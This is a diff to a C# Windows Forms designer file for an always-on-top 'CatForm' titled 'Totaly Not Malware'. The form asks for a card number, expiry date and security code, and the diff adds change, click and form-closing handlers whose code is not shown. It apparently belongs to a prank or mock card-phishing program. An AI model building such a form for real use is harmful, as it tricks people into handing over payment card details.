@@ -57,6 +57,7 @@
             this.cardNumberTextBox.Name = "cardNumberTextBox";
             this.cardNumberTextBox.Size = new System.Drawing.Size(229, 31);
             this.cardNumberTextBox.TabIndex = 1;
+            this.cardNumberTextBox.TextChanged += new System.EventHandler(this.cardNumberTextBox_TextChanged);
             // 
             // expirityTextBox
             // 
@@ -65,6 +66,7 @@
             this.expirityTextBox.Name = "expirityTextBox";
             this.expirityTextBox.Size = new System.Drawing.Size(229, 31);
             this.expirityTextBox.TabIndex = 2;
+            this.expirityTextBox.TextChanged += new System.EventHandler(this.expirityTextBox_TextChanged);
             // 
             // securityCodeTextBox
             // 
@@ -83,6 +85,7 @@
             this.thanksTextBox.TabIndex = 4;
             this.thanksTextBox.Text = "Th-thanks";
             this.thanksTextBox.UseVisualStyleBackColor = true;
+            this.thanksTextBox.Click += new System.EventHandler(this.thanksTextBox_Click);
             // 
             // cardLabel
             // 
@@ -147,6 +150,7 @@
             this.Name = "CatForm";
             this.Text = "Totaly Not Malware";
             this.TopMost = true;
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.CatForm_FormClosing);
             ((System.ComponentModel.ISupportInitialize)(this.catPictureBox)).EndInit();
             this.ResumeLayout(false);
             this.PerformLayout();
